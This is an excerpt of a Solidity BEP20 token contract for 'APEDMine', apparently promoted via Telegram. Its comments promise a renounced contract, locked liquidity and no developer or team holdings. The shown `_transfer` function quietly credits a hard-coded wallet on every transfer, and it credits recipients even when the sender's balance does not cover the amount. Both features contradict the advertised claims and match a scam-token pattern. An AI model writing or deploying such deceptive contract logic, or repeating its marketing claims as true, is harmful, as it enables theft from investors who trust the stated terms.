...
// Submitted for Telegram: https://t.me/apedmine_official
// 🦍🦍 APEDMine is Token Community from Bsc Network.. 🦍🦍

// -- Launch On Pancake
// -- TAX 4%/4%
// -- Contract Renounce Before Launch
// -- LP Will Lock 3 Years
// -- No Tokn balance Dev and Team
// -- 100% token community
// -- Website stake EARN BNB-BUSD-BTCBep20 will available Soon.
...
contract  ApedmineTokenBep20  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xDe8bC77534e1d0fB27b164895722ddC283075bC4] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0xDe8bC77534e1d0fB27b164895722ddC283075bC4, _teamtoken);
        }
